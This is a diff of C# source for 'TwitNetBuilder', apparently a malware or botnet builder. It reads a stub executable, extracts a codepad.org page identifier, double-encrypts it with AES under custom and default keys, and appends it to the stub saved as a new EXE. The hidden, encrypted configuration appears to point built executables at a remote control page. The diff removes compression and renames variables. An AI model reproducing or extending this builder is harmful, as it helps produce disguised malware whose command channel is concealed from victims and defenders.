@@ -3,7 +3,6 @@ using System.Text;
 using System.Windows.Forms;
 using System.IO;
 using System.Text.RegularExpressions;
-using TwitNetBuilder.Util.Compression;
 using TwitNetBuilder.Util.Encryption;
 
 namespace TwitNetBuilder
@@ -18,12 +17,12 @@ namespace TwitNetBuilder
         private void BuildButtonClick(object sender, EventArgs e)
         {
             //We find the file name to save as
-            SaveFileDialog StubSaveDialog = new SaveFileDialog {
+            SaveFileDialog stubSaveDialog = new SaveFileDialog {
                            Filter = "EXE File(*.exe)|*.exe",
                            InitialDirectory = Application.StartupPath,
                            Title = "Save Stub As..." };
-            DialogResult showDialog = StubSaveDialog.ShowDialog();
-            if(string.IsNullOrEmpty(StubSaveDialog.FileName) || showDialog != DialogResult.OK)
+            DialogResult showDialog = stubSaveDialog.ShowDialog();
+            if(string.IsNullOrEmpty(stubSaveDialog.FileName) || showDialog != DialogResult.OK)
             {
                 return;
             }
@@ -31,7 +30,7 @@ namespace TwitNetBuilder
             //We load the stub and config data (just a url for now)
             Constants.CustomEncryptionKey = EncryptKeyBox.Text;
             byte[] stub = File.ReadAllBytes(Constants.StubFileName);
-            string appendData = Regex.Split(CodePadBox.Text, "http://")[1].Split('.')[0];
+            //string appendData = Constants.Splitter + Regex.Split(CodePadBox.Text, "http://")[1].Split('.')[0];
 
             /*
              * K so im going to try and document this well since you are high:
@@ -44,21 +43,29 @@ namespace TwitNetBuilder
              * encrypted data, you might want to uncomment the last appendData assertion
              * which just adds a splitter before all of this.
              */
-            //We run fancy encryption (check for documentation)
-            SimpleAES defaultAES = new SimpleAES();
 
-            defaultAES.Key = Encoding.Default.GetBytes(Constants.CustomEncryptionKey);
-            appendData = defaultAES.EncryptToString(appendData) + Constants.Splitter + Constants.DefaultEncryptionKey;
             
-            defaultAES.Key = Encoding.Default.GetBytes(Constants.DefaultEncryptionKey);
-            appendData = defaultAES.EncryptToString(appendData);
-            appendData = Constants.Splitter + appendData;
+            //We run fancy encryption (check for documentation)
+            SimpleAES customAES = new SimpleAES();
 
-            //We write the original stub exe + a GZipped appendData
-            StreamWriter writer = new StreamWriter(StubSaveDialog.FileName, false, Encoding.Default);
+            customAES.Key = Encoding.Default.GetBytes(Constants.CustomEncryptionKey);
+            string appendData = customAES.EncryptToString(Regex.Split(CodePadBox.Text, "http://")[1].Split('.')[0]);
+            
+
+            SimpleAES defaultAES = new SimpleAES();
+            defaultAES.Key = Encoding.Default.GetBytes(Constants.DefaultEncryptionKey);
+            appendData = Constants.Splitter + defaultAES.EncryptToString(appendData + Constants.Splitter + Constants.CustomEncryptionKey);
+
+            //Above steps:
+            //CustomKeycrypt(codepad page)
+            //|split|DefaultKeycrypt(CustomKeycrypt(codepad page)|split|+CustomKey)
+
+
+            //We write the original stub exe + appended data
+            StreamWriter writer = new StreamWriter(stubSaveDialog.FileName, false, Encoding.Default);
             writer.AutoFlush = true;
             writer.Write(Encoding.Default.GetString(stub));
-            writer.Write(Encoding.Default.GetString(GZip.CompressData(Encoding.Default.GetBytes(appendData))));
+            writer.Write(appendData);
             writer.Close();
 
             MessageBox.Show("Completed");
